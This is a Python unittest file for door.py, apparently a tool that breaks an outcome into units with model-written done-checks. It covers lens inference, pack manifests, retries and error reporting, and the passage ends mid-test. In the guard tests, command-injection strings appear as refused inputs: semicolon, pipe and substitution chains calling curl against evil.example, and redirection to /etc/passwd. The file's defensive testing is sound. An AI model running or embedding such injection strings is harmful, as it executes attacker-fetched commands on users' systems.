"""door.py, driven as the real command line, with a stub standing in for the
model. No network, no real claude invocation: each case writes its own
decomposer script into a tempdir and points --model-cmd at it, the same way
test_spine.py stands in a fake worker for the real one.
"""
import contextlib
import io
import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
DOOR = os.path.join(HERE, "door.py")
import door as door_mod  # noqa: E402
import model_worker  # noqa: E402

# E100: one sandbox for every temp tree this process makes, removed at exit.
import os as _e100_os, sys as _e100_sys  # noqa: E402
_e100_sys.path.append(_e100_os.path.join(
    _e100_os.path.dirname(_e100_os.path.abspath(__file__)), '.'))
try:  # noqa: E402
    import tmp_sandbox as _e100_tmp
    _e100_tmp.install()
except ImportError:
    # A packager (scripts/export_public.py, make_benchmark_bundle.py)
    # can copy this test without scripts/tmp_sandbox.py beside it. Say
    # so rather than dying: the sandbox is hygiene, not the subject.
    _e100_sys.stderr.write(
        "tmp_sandbox absent: %s leaves its temp trees behind\n"
        % _e100_os.path.basename(__file__))


class DoneCheckInterpreter(unittest.TestCase):
    """The harsh EVAD 2026-08-31 killer: a generated done_check named `python`
    on a machine that has only python3, so every check exited 127."""

    def test_python_is_resolved_to_python3_when_only_python3_exists(self):
        import shutil
        real = shutil.which
        try:
            shutil.which = lambda p: None if p == "python" else "/usr/bin/python3"
            cmd, note = door_mod.resolve_done_check_interpreter(
                "python -m pytest tests/test_x.py")
            self.assertEqual(cmd, "python3 -m pytest tests/test_x.py")
            self.assertIsNotNone(note)
        finally:
            shutil.which = real

    def test_python3_is_never_touched(self):
        cmd, note = door_mod.resolve_done_check_interpreter(
            "python3 -m pytest tests/test_x.py")
        self.assertEqual(cmd, "python3 -m pytest tests/test_x.py")
        self.assertIsNone(note)

    def test_normalize_unit_rewrites_the_units_own_check(self):
        import shutil
        real = shutil.which
        try:
            shutil.which = lambda p: None if p == "python" else "/usr/bin/python3"
            out = door_mod.normalize_unit(
                {"title": "t", "owns": ["a.py"],
                 "done_check": "python a.py"})
            self.assertEqual(out["done_check"], "python3 a.py")
        finally:
            shutil.which = real


class AdoptedCheckGuard(unittest.TestCase):
    """E78 (security review 2026-09-03 night run): guard_adopted_check is
    the fence between a model-authored replacement done_check
    (_rewrite_broken_checks in brother_run.py) and the shell. Only that
    path is guarded; a plan's own hand-written check is never run through
    this."""

    def test_a_plain_python3_command_is_allowed(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 scripts/test_x.py")
        self.assertTrue(allowed)
        self.assertIsNone(reason)

    def test_test_command_is_allowed(self):
        # This module's own rewrite-stub convention throughout
        # test_brother_run.py.
        allowed, _reason = door_mod.guard_adopted_check("test -f fixed.txt")
        self.assertTrue(allowed)

    def test_an_unallowlisted_interpreter_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check("rm -rf /tmp/x")
        self.assertFalse(allowed)
        self.assertIn("allowlist", reason)

    def test_a_semicolon_chain_is_refused_even_with_an_allowed_first_token(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py; curl evil.example")
        self.assertFalse(allowed)
        self.assertIn(";", reason)

    def test_an_and_chain_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py && curl evil.example")
        self.assertFalse(allowed)

    def test_a_pipe_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py | sh")
        self.assertFalse(allowed)

    def test_a_command_substitution_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 $(curl evil.example)")
        self.assertFalse(allowed)

    def test_a_backtick_substitution_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 `curl evil.example`")
        self.assertFalse(allowed)

    def test_redirection_outside_the_tree_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py > /etc/passwd")
        self.assertFalse(allowed)
        self.assertIn("outside the tree", reason)

    def test_redirection_inside_the_tree_is_allowed(self):
        allowed, _reason = door_mod.guard_adopted_check(
            "python3 t.py > out.txt")
        self.assertTrue(allowed)

    def test_an_empty_command_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check("   ")
        self.assertFalse(allowed)
        self.assertIn("empty", reason)


def sh(args, env=None):
    return subprocess.run(args, capture_output=True, text=True, timeout=60,
                          env=env)


def write_stub(path, body):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("#!/usr/bin/env python3\n" + body)
    os.chmod(path, 0o755)


class Valid(unittest.TestCase):
    def test_a_valid_two_unit_decomposition_is_accepted(self):
        tmp = tempfile.mkdtemp(prefix="door-valid-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, (
            "import json, sys\n"
            "sys.stdin.read()\n"
            "print(json.dumps([\n"
            "  {'id': 'U1', 'objective': 'make one', "
            "'done_check': 'test -f one.txt', 'writes': ['one.txt'], "
            "'deps': []},\n"
            "  {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "]))\n"
        ))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "two files exist",
                  "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub)),
                  "--store", store])
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertTrue(proc.stdout.strip())
        work_id = proc.stdout.splitlines()[0].split()[1]
        self.assertTrue(work_id)

        files = os.listdir(store)
        self.assertEqual(len(files), 1)
        with open(os.path.join(store, files[0]), encoding="utf-8") as fh:
            record = json.load(fh)
        ids = {r["id"] for r in record["rows"]}
        self.assertEqual(ids, {"U1", "U2"})


class Retry(unittest.TestCase):
    def test_a_refused_answer_is_retried_with_the_refusal_text(self):
        tmp = tempfile.mkdtemp(prefix="door-retry-")
        stub = os.path.join(tmp, "stub.py")
        counter = os.path.join(tmp, "count")
        stdin2 = os.path.join(tmp, "stdin2.txt")
        write_stub(stub, (
            "import json, os, sys\n"
            "counter = %r\n"
            "stdin2 = %r\n"
            "n = 0\n"
            "if os.path.exists(counter):\n"
            "    n = int(open(counter).read() or '0')\n"
            "n += 1\n"
            "open(counter, 'w').write(str(n))\n"
            "stdin_text = sys.stdin.read()\n"
            "if n == 1:\n"
            "    units = [\n"
            "        {'id': 'U1', 'objective': 'make one', 'done_check': '', "
            "'writes': ['one.txt'], 'deps': []},\n"
            "        {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "    ]\n"
            "else:\n"
            "    open(stdin2, 'w').write(stdin_text)\n"
            "    units = [\n"
            "        {'id': 'U1', 'objective': 'make one', "
            "'done_check': 'test -f one.txt', 'writes': ['one.txt'], "
            "'deps': []},\n"
            "        {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "    ]\n"
            "print(json.dumps(units))\n"
        ) % (counter, stdin2))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "two files exist",
                  "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub)),
                  "--store", store])
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        with open(counter, encoding="utf-8") as fh:
            self.assertEqual(fh.read().strip(), "2")
        self.assertTrue(os.path.exists(stdin2))
        with open(stdin2, encoding="utf-8") as fh:
            second_stdin = fh.read()
        self.assertIn("no done_check", second_stdin)
        self.assertIn("U1", second_stdin)


class Refused(unittest.TestCase):
    def test_a_cyclic_decomposition_is_refused_and_nothing_is_stored(self):
        tmp = tempfile.mkdtemp(prefix="door-cyclic-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, (
            "import json, sys\n"
            "sys.stdin.read()\n"
            "print(json.dumps([\n"
            "  {'id': 'A', 'objective': 'a', 'done_check': 'true', "
            "'writes': ['a.txt'], 'deps': ['B']},\n"
            "  {'id': 'B', 'objective': 'b', 'done_check': 'true', "
            "'writes': ['b.txt'], 'deps': ['A']},\n"
            "]))\n"
        ))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "a cycle nobody can schedule",
                  "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub)),
                  "--store", store])
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(os.path.exists(store))
        self.assertIn("cycle", proc.stdout + proc.stderr)


class NoData(unittest.TestCase):
    def test_a_missing_decomposer_is_NO_DATA_not_a_crash(self):
        tmp = tempfile.mkdtemp(prefix="door-nodata-")
        store = os.path.join(tmp, "store")
        env = dict(os.environ)
        env["DOOR_MODEL_CMD"] = "/no/such/decomposer --flag"

        proc = sh([sys.executable, DOOR, "an outcome", "--store", store],
                  env=env)
        self.assertEqual(proc.returncode, 44, proc.stdout + proc.stderr)
        self.assertTrue(any(l.startswith("NO-DATA")
                            for l in (proc.stdout + proc.stderr).splitlines()))
        self.assertFalse(os.path.exists(store))


class FailingDecomposer(unittest.TestCase):
    """D2, found by the Codex lane on 2026-09-05: door.py never looked at the
    child's exit code, so a decomposer that failed and wrote nothing was
    reported as though it had answered badly. Exit 7 appeared nowhere."""

    def test_a_decomposer_that_exits_7_is_reported_with_its_exit_code(self):
        tmp = tempfile.mkdtemp(prefix="door-exit7-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, (
            "import sys\n"
            "sys.stdin.read()\n"
            "sys.stderr.write('the child could not reach its service\\n')\n"
            "sys.exit(7)\n"
        ))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "make a.txt uppercase",
                   "--max-retries", "0", "--store", store,
                   "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub))])
        out = proc.stdout + proc.stderr
        self.assertNotEqual(proc.returncode, 0, out)
        self.assertIn("exited 7", out)
        self.assertIn("the child could not reach its service", out)
        self.assertFalse(os.path.exists(store))

    def test_a_decomposer_that_answers_badly_at_exit_0_names_no_exit_code(self):
        """The other side of the same fence: a healthy decomposer that simply
        answers nonsense must not grow an exit-code clause it did not earn."""
        tmp = tempfile.mkdtemp(prefix="door-exit0-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, "import sys\nsys.stdin.read()\nprint('not json')\n")
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "make a.txt uppercase",
                   "--max-retries", "0", "--store", store,
                   "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub))])
        out = proc.stdout + proc.stderr
        self.assertNotEqual(proc.returncode, 0, out)
        self.assertIn("could not be read as JSON", out)
        self.assertNotIn("exited", out)


class TheHostsOwnDecomposer(unittest.TestCase):
    """Under Codex the default decomposer is Codex's own headless exec, never
    `claude -p`: a Codex-only machine has no claude binary, and inside a
    codex turn the sandbox blocks every socket either of them would open."""

    def test_a_claude_host_still_defaults_to_the_claude_cli(self):
        self.assertEqual(door_mod.default_model_cmd({"CLAUDECODE": "1"}),
                         ["claude", "-p"])

    def test_a_codex_host_defaults_to_the_codex_argv_model_worker_ships(self):
        cmd = door_mod.default_model_cmd({"BROTHER_CLIENT": "codex"})
        self.assertEqual(cmd, list(model_worker.CODEX_ARGV))
        self.assertNotIn("claude", cmd)

    def test_a_cursor_host_defaults_to_the_cursor_argv_model_worker_ships(self):
        """U2: a Cursor-only machine has no claude binary either, so it gets
        model_worker's own measured CURSOR_ARGV, never `claude -p`."""
        cmd = door_mod.default_model_cmd({"BROTHER_CLIENT": "cursor"})
        self.assertEqual(cmd, list(model_worker.CURSOR_ARGV))
        self.assertNotIn("claude", cmd)

    def test_the_codex_answer_is_read_out_of_its_jsonl_events(self):
        events = "\n".join([
            json.dumps({"type": "response.created"}),
            json.dumps({"type": "item.completed.agent_message",
                        "text": '[{"id": "U1"}]'}),
        ])
        self.assertEqual(
            door_mod.decomposer_text(list(model_worker.CODEX_ARGV), events),
            '[{"id": "U1"}]')

    def test_the_cursor_answer_is_read_out_of_its_json_envelope(self):
        envelope = json.dumps({"is_error": False, "result": '[{"id": "U1"}]',
                               "usage": {"inputTokens": 1, "outputTokens": 2}})
        self.assertEqual(
            door_mod.decomposer_text(list(model_worker.CURSOR_ARGV), envelope),
            '[{"id": "U1"}]')

    def test_a_plain_command_s_stdout_is_returned_unchanged(self):
        self.assertEqual(door_mod.decomposer_text(["cat", "plan.json"], "[]"),
                         "[]")

    def test_a_missing_decomposer_under_codex_names_the_sandbox_and_the_fix(self):
        tmp = tempfile.mkdtemp(prefix="door-codex-nodata-")
        store = os.path.join(tmp, "store")
        env = dict(os.environ)
        env["BROTHER_CLIENT"] = "codex"
        env["DOOR_MODEL_CMD"] = "/no/such/decomposer --flag"

        proc = sh([sys.executable, DOOR, "an outcome", "--store", store],
                  env=env)
        out = proc.stdout + proc.stderr
        self.assertEqual(proc.returncode, 44, out)
        self.assertIn("sandboxed turn", out)
        self.assertIn("app-server", out)
        self.assertIn("DOOR_MODEL_CMD", out)
        self.assertFalse(os.path.exists(store))


class PackManifests(unittest.TestCase):
    """P2 (persona integration): scripts/packs/core.json and
    scripts/packs/data-science.json are the pack manifests as data; door.py
    only loads and validates them in this row, nothing wires them into a
    prompt yet.

    The list is no longer pinned to those two names. Eleven persona packs
    landed beside them, and a test that names its population fails on every
    pack a later lane adds while saying nothing about the pack that was
    added: what this holds is that the two packs it reasons about are
    present and that pack_manifests validated whatever else is installed.
    Every pack's own contract is scripts/test_packs.py, which enumerates
    the directory rather than naming it."""

    def test_pack_manifests_carry_every_required_key(self):
        manifests = door_mod.pack_manifests()
        for expected in ("core", "data-science"):
            self.assertIn(expected, manifests)
        for name, manifest in manifests.items():
            for key in door_mod.PACK_REQUIRED_KEYS:
                self.assertIn(key, manifest,
                              "%s is missing %r" % (name, key))
        self.assertEqual(
            manifests["data-science"]["challenge_question"],
            "What is the pre-registered success metric and "
            "holdout/evaluation rule?")
        self.assertEqual(
            sorted(manifests["data-science"]["required_evidence_families"]),
            ["E18", "E2", "E8"])

    def test_a_manifest_missing_a_key_is_refused_by_name(self):
        tmp = tempfile.mkdtemp(prefix="door-pack-")
        good = door_mod.load_pack("core")
        broken = dict(good)
        del broken["forcing_classes"]
        del broken["challenge_question"]
        with open(os.path.join(tmp, "broken.json"), "w", encoding="utf-8") as fh:
            json.dump(broken, fh)

        with self.assertRaises(ValueError) as ctx:
            door_mod.load_pack("broken", packs_dir=tmp)
        message = str(ctx.exception)
        self.assertIn("forcing_classes", message)
        self.assertIn("challenge_question", message)

    def test_a_missing_pack_file_is_refused_by_name(self):
        tmp = tempfile.mkdtemp(prefix="door-pack-missing-")
        with self.assertRaises(ValueError) as ctx:
            door_mod.load_pack("no-such-lens", packs_dir=tmp)
        self.assertIn("no-such-lens", str(ctx.exception))

    def test_an_unreadable_manifest_is_skipped_and_named_on_stderr(self):
        """silent-failure-lints hit at scripts/door.py:160 (pre-fix): a bare
        `except OSError: continue` dropped which manifest failed to read
        and why. A listed path that does not exist on disk (deleted between
        list_repo_files and this read, or simply unreachable) is the
        reliable, permission-independent way to hit OSError here."""
        tmp = tempfile.mkdtemp(prefix="door-manifest-unreadable-")
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            hit = door_mod._manifest_string_hit(
                tmp, ["requirements.txt"], "mlflow")
        self.assertIsNone(hit)
        stderr = buf.getvalue()
        self.assertIn("requirements.txt", stderr)
        self.assertIn("skipped", stderr)


class PathSignalMatching(unittest.TestCase):
    """_path_matches_signal: the two signal shapes a pack manifest carries
    (persona doc 3.3). A '/'-suffixed signal is a directory name at any
    depth; anything else is an fnmatch against the basename."""

    def test_a_glob_signal_matches_a_notebook_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal("a.ipynb", "*.ipynb"))
        self.assertTrue(door_mod._path_matches_signal(
            "notebooks/deep/a.ipynb", "*.ipynb"))
        self.assertFalse(door_mod._path_matches_signal("a.py", "*.ipynb"))

    def test_a_bare_filename_signal_matches_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal(
            "dvc.yaml", "dvc.yaml"))
        self.assertTrue(door_mod._path_matches_signal(
            "sub/dvc.yaml", "dvc.yaml"))

    def test_a_directory_signal_matches_a_file_under_it_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal(
            "mlruns/0/meta.yaml", "mlruns/"))
        self.assertTrue(door_mod._path_matches_signal(
            "sub/mlruns/0/meta.yaml", "mlruns/"))
        self.assertFalse(door_mod._path_matches_signal(
            "notmlruns/x.txt", "mlruns/"))


class LensInference(unittest.TestCase):
    """P3 (persona integration): infer_lens matches list_repo_files output
    against every pack's own detection_signals (persona doc 3.3: 'Infer
    from repository/work and let the human correct the inference')."""

    def test_ipynb_and_mlruns_infer_data_science(self):
        tmp = tempfile.mkdtemp(prefix="door-infer-ds-")
        listed = ["a.ipynb", "b.ipynb", "mlruns/0/meta.yaml", "README.md"]
        lens, matched = door_mod.infer_lens(tmp, listed)
        self.assertEqual(lens, "data-science")
        self.assertIn("a.ipynb", matched)
        self.assertIn("b.ipynb", matched)
        self.assertIn("mlruns/0/meta.yaml", matched)
        self.assertNotIn("README.md", matched)

    def test_a_plain_tree_infers_no_lens(self):
        lens, matched = door_mod.infer_lens(
            "/does/not/matter", ["README.md", "src/main.py"])
        self.assertIsNone(lens)
        self.assertEqual(matched, [])

    def test_a_manifest_string_hit_infers_the_lens_with_no_paths(self):
        tmp = tempfile.mkdtemp(prefix="door-infer-manifest-")
        with open(os.path.join(tmp, "requirements.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write("mlflow==2.0\nnumpy\n")
        lens, matched = door_mod.infer_lens(tmp, ["requirements.txt"])
        self.assertEqual(lens, "data-science")
        self.assertEqual(matched, ["requirements.txt"])

    def test_an_unreadable_packs_dir_infers_no_lens(self):
        """silent-failure-lints hit at scripts/door.py:181 (pre-fix): a bare
        `except ValueError: return None, []` dropped why pack_manifests
        failed. The reason must now name the broken packs_dir on stderr."""
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            lens, matched = door_mod.infer_lens(
                "/does/not/matter", ["a.ipynb"], packs_dir="/no/such/dir")
        self.assertIsNone(lens)
        self.assertEqual(matched, [])
        self.assertIn("/no/such/dir", buf.getvalue())


def _two_pack_dir(case):
    """A packs directory holding core, data-science and a second
    signal-bearing pack, for driving compositional selection. The second
    pack is a real copy of data-science with its own lens name, one
    detection signal ('*.sql', which data-science does not carry), its
    own challenge question,
    receipt fields and evidence families, so a tree can match BOTH packs
    and the composition is visible in what comes back. Returns the
    directory path; the caller's tempdir is cleaned up by addCleanup."""
    tmp = tempfile.mkdtemp(prefix="door-compose-")
    case.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
    packs = os.path.join(tmp, "packs")
    os.makedirs(packs)
    for name in ("core", "data-science"):
        with open(os.path.join(door_mod.PACKS_DIR, "%s.json" % name),
                 encoding="utf-8") as fh:
            pack = json.load(fh)
        with open(os.path.join(packs, "%s.json" % name), "w",
                 encoding="utf-8") as fh:
            json.dump(pack, fh)
    second = dict(pack)  # the data-science manifest just read
    second["lens"] = "data-engineering"
    second["detection_signals"] = {"paths": ["*.sql"],
                                   "manifest_strings": []}
    second["challenge_question"] = ("Which system of record is this grain "
                                    "reconciled against?")
    second["receipt_fields"] = ["grain", "reconciliation"]
    second["required_evidence_families"] = ["E2", "E9"]
    second["forcing_classes"] = [
        {"id": "backfill", "label": "Backfill", "why": "a historical "
         "rewrite of an already-published table"}]
    with open(os.path.join(packs, "data-engineering.json"), "w",
             encoding="utf-8") as fh:
        json.dump(second, fh)
    return tmp, packs


class CompositionalLensSelection(unittest.TestCase):
    """Persona doc 5.2, "Pack selection must be compositional". BEFORE this
    row infer_lens returned the FIRST pack in sorted lens-name order, so a
    tree that is both data engineering and data science got exactly one
    lens (and with thirteen packs installed, "architect" would win every
    tree it matched). These cases fail against that behaviour: the first
    asserts BOTH packs come back, which a single-lens return cannot do."""

    def test_a_tree_matching_two_packs_returns_both_ordered(self):
        tmp, packs = _two_pack_dir(self)
        listed = ["a.ipynb", "mlruns/0/meta.yaml", "models/revenue.sql"]
        inferred = door_mod.infer_lenses(tmp, listed, packs_dir=packs)
        names = [name for name, _matched in inferred]
        # data-science fired two signals ('*.ipynb' and 'mlruns/'),
        # data-engineering one, so specificity orders them; core is the
        # base and is always last.
        self.assertEqual(names, ["data-science", "data-engineering", "core"])
        matched = dict(inferred)
        self.assertIn("a.ipynb", matched["data-science"])
        self.assertEqual(matched["data-engineering"],
                         ["models/revenue.sql"])
        self.assertEqual(matched["core"], [])

    def test_priority_breaks_a_specificity_tie(self):
        tmp, packs = _two_pack_dir(self)
        path = os.path.join(packs, "data-engineering.json")
        with open(path, encoding="utf-8") as fh:
            pack = json.load(fh)
        pack["priority"] = 5
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(pack, fh)
        # one signal each: only `priority` can order them, and without it
        # sorted lens-name order would put data-engineering first anyway,
        # so the tie is proven the other way round below.
        inferred = door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)
        self.assertEqual([n for n, _m in inferred],
                         ["data-engineering", "data-science", "core"])
        pack["priority"] = -5
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(pack, fh)
        inferred = door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)
        self.assertEqual([n for n, _m in inferred],
                         ["data-science", "data-engineering", "core"])

    def test_the_single_lens_accessor_is_the_most_specific_pack(self):
        tmp, packs = _two_pack_dir(self)
        lens, matched = door_mod.infer_lens(
            tmp, ["a.ipynb", "mlruns/0/meta.yaml", "models/revenue.sql"],
            packs_dir=packs)
        self.assertEqual(lens, "data-science")
        self.assertIn("mlruns/0/meta.yaml", matched)

    def test_an_unmatched_tree_composes_nothing_not_even_core(self):
        tmp, packs = _two_pack_dir(self)
        self.assertEqual(
            door_mod.infer_lenses(tmp, ["README.md"], packs_dir=packs), [])
        self.assertEqual(
            door_mod.infer_lens(tmp, ["README.md"], packs_dir=packs),
            (None, []))

    def test_the_assumption_line_names_every_inferred_lens(self):
        tmp, packs = _two_pack_dir(self)
        line = door_mod.lenses_assumption_line(door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs))
        self.assertIn("data-science work (found a.ipynb)", line)
        self.assertIn("data-engineering work (found models/revenue.sql)",
                      line)
        self.assertNotIn("core", line)
        self.assertIn("say otherwise to change it", line)

    def test_the_union_is_every_composed_pack_s_fields(self):
        tmp, packs = _two_pack_dir(self)
        names = [n for n, _m in door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)]
        union = door_mod.pack_union(names, packs_dir=packs)
        self.assertIn("grain", union["receipt_fields"])
        self.assertIn("split_identity", union["receipt_fields"])
        self.assertIn("harness_revision", union["receipt_fields"])
        self.assertEqual(union["required_evidence_families"][0], "E2")
        self.assertEqual(len(union["required_evidence_families"]),
                         len(set(union["required_evidence_families"])))
        for family in ("E2", "E8", "E18", "E9", "E1", "E6"):
            self.assertIn(family, union["required_evidence_families"])

    def test_an_unreadable_pack_is_named_and_the_others_still_compose(self):
        tmp, packs = _two_pack_dir(self)
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            union = door_mod.pack_union(["no-such-lens", "core"],
                                        packs_dir=packs)
        self.assertIn("no-such-lens", buf.getvalue())
        self.assertIn("harness_revision", union["receipt_fields"])


class ComposedChallengeQuestions(unittest.TestCase):
    """compute_challenge composes (persona doc 5.2 and 4.2): the most
    specific lens's question first, another pack's only when one of ITS
    forcing classes fires on a unit, the whole list cut to the summed
    question budget capped at QUESTION_BUDGET_CEILING."""

    def _units(self, objective):
        return [{"id": "U1", "objective": objective, "done_check": "true",
                 "owns": []}]

    def test_the_primary_question_alone_when_no_other_class_fires(self):
        tmp, packs = _two_pack_dir(self)
        assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering", "core"],
            self._units("promote the new model to production"),
            packs_dir=packs)
        self.assertIsNone(assumption)
        self.assertEqual(pending["lens"], "data-science")
        self.assertEqual([q["lens"] for q in pending["questions"]],
                         ["data-science"])

    def test_a_second_pack_earns_a_question_when_its_class_fires(self):
        tmp, packs = _two_pack_dir(self)
        assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering", "core"],
            self._units("promote the new model after the backfill of the "
                        "published revenue table"),
            packs_dir=packs)
        self.assertIsNone(assumption)
        self.assertEqual([q["lens"] for q in pending["questions"]],
                         ["data-science", "data-engineering"])
        # the P5 shape is unchanged for every reader that wants one
        # question: the primary lens and its question, at the top level.
        self.assertEqual(pending["lens"], "data-science")
        self.assertIn("pre-registered", pending["question"])

    def test_the_composed_list_never_exceeds_the_4_2_ceiling(self):
        self.assertEqual(door_mod.QUESTION_BUDGET_CEILING, 6)
        tmp, packs = _two_pack_dir(self)
        for name in ("data-engineering",):
            path = os.path.join(packs, "%s.json" % name)
            with open(path, encoding="utf-8") as fh:
                pack = json.load(fh)
            pack["question_budget"] = {"min": 0, "max": 0}
            with open(path, "w", encoding="utf-8") as fh:
                json.dump(pack, fh)
        # data-science's own max is 4, data-engineering's is now 0: the sum
        # is 4, still above the one question composed here, so the cut is
        # proven by the ceiling constant and by the list staying inside it.
        _assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering"],
            self._units("promote the model after the backfill"),
            packs_dir=packs)
        self.assertLessEqual(len(pending["questions"]),
                             door_mod.QUESTION_BUDGET_CEILING)

    def test_a_single_lens_name_still_works_unchanged(self):
        tmp, packs = _two_pack_dir(self)
        _assumption, pending = door_mod.compute_challenge(
            tmp, [], "data-science",
            self._units("promote the new model"), packs_dir=packs)
        self.assertEqual(pending["lens"], "data-science")


class LensAssumptionLine(unittest.TestCase):
    """The intent screen's own assumption line (P3 what_they_see): 'Assumed:
    <lens> work (found <paths>); say otherwise to change it', capped at
    MAX_ASSUMPTION_PATHS names."""

    def test_no_lens_is_the_empty_line(self):
        self.assertEqual(door_mod.lens_assumption_line(None, []), "")
        self.assertEqual(door_mod.lens_assumption_line("data-science", []), "")

    def test_the_line_names_the_lens_and_the_matched_paths(self):
        line = door_mod.lens_assumption_line(
            "data-science", ["a.ipynb", "b.ipynb"])
        self.assertIn("Assumed: data-science work", line)
        self.assertIn("a.ipynb, b.ipynb", line)
        self.assertIn("say otherwise to change it", line)

    def test_a_long_match_list_is_capped_with_a_count(self):
        line = door_mod.lens_assumption_line(
            "data-science", ["a.ipynb", "b.ipynb", "c.ipynb", "d.ipynb"])
        self.assertIn("and 1 more", line)
        self.assertNotIn("d.ipynb", line)


class ChallengeSwallows(unittest.TestCase):
    """P5's two error paths (find_metric_in_tree, compute_challenge), the
    other half of the door.py silent-failure-lints hits: an unreadable
    README or a broken pack must be named on stderr, not just dropped."""

    def test_an_unreadable_readme_is_skipped_and_named_on_stderr(self):
        """silent-failure-lints hit at scripts/door.py:284 (pre-fix): a bare
        `except OSError: continue` dropped which README failed to read.
        A directory named like a README is a reliable, permission-
        independent way to make open() raise OSError here."""
        tmp = tempfile.mkdtemp(prefix="door-metric-readme-")
        os.mkdir(os.path.join(tmp, "README.md"))
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            hit = door_mod.find_metric_in_tree(tmp, ["README.md"])
        self.assertIsNone(hit)
        stderr = buf.getvalue()
        self.assertIn("README.md", stderr)
        self.assertIn("skipped", stderr)

    def test_a_broken_pack_is_named_when_computing_the_challenge(self):
        """silent-failure-lints hit at scripts/door.py:307 (pre-fix): a bare
        `except ValueError: return None, None` dropped why load_pack
        failed for the inferred lens. The reason must now name the lens
        on stderr."""
        tmp = tempfile.mkdtemp(prefix="door-challenge-broken-")
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            assumption, pending = door_mod.compute_challenge(
                "/does/not/matter", [], "no-such-lens",
                [{"objective": "promote the new model"}], packs_dir=tmp)
        self.assertIsNone(assumption)
        self.assertIsNone(pending)
        self.assertIn("no-such-lens", buf.getvalue())


def _stub_that_writes_one_unit(stub_path):
    write_stub(stub_path, (
        "import json, sys\n"
        "sys.stdin.read()\n"
        "print(json.dumps([\n"
        "  {'id': 'U1', 'objective': 'do it', 'done_check': 'true', "
        "'writes': ['x.txt'], 'deps': []},\n"
        "]))\n"
    ))


class LensInferenceEndToEnd(unittest.TestCase):
    """P3's own done-check: a real door.py run, against a real temp tree,
    stamps lens_inferred on the Work document it writes. `--cwd` is not a
    door.py flag; the target tree is door's own process cwd, exactly as
    run_door() in brother_run.py already invokes it."""

    def _run_door_in(self, repo, outcome="a data science change"):
        stub_tmp = tempfile.mkdtemp(prefix="door-lens-stub-")
        stub = os.path.join(stub_tmp, "stub.py")
        _stub_that_writes_one_unit(stub)
        store = os.path.join(repo, "store")
        proc = subprocess.run(
            [sys.executable, DOOR, outcome,
             "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub)),
             "--store", store],
            capture_output=True, text=True, timeout=60, cwd=repo)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        files = [f for f in os.listdir(store) if f.endswith(".json")]
        self.assertEqual(len(files), 1)
        with open(os.path.join(store, files[0]), encoding="utf-8") as fh:
            return json.load(fh)

    def test_a_tree_with_notebooks_and_mlruns_infers_data_science(self):
        repo = tempfile.mkdtemp(prefix="door-lens-ds-repo-")
        for name in ("a.ipynb", "b.ipynb"):
            with open(os.path.join(repo, name), "w", encoding="utf-8") as fh:
                fh.write("{}")
        os.makedirs(os.path.join(repo, "mlruns", "0"))
        with open(os.path.join(repo, "mlruns", "0", "meta.yaml"), "w",
                 encoding="utf-8") as fh:
            fh.write("run: 0\n")

        record = self._run_door_in(repo)
